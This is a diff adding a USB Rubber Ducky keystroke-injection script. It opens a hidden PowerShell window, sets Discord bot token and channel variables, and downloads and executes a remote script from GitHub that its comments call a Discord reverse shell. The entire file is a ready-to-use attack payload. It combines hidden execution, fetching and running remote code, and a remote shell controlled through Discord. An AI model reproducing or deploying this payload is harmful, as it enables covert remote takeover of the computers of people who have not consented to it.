@@ -1,0 +1,17 @@
+REM Launch PowerShell hidden
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -W H
+ENTER
+DELAY 500
+
+REM  Set Bot Token and Channel ID
+STRING $t="YOUR_DISCORD_BOT_TOKEN";
+ENTER
+STRING $c="YOUR_DISCORD_CHANNEL_ID";
+ENTER
+
+REM === Download and Execute the Reverse Shell Script ===
+STRING iwr "https://raw.githubusercontent.com/colepez/duckyscripts/main/RubberDucky/Discord%20Reverse%20Shell/Discord.ps1" -UseBasicParsing | iex
+ENTER
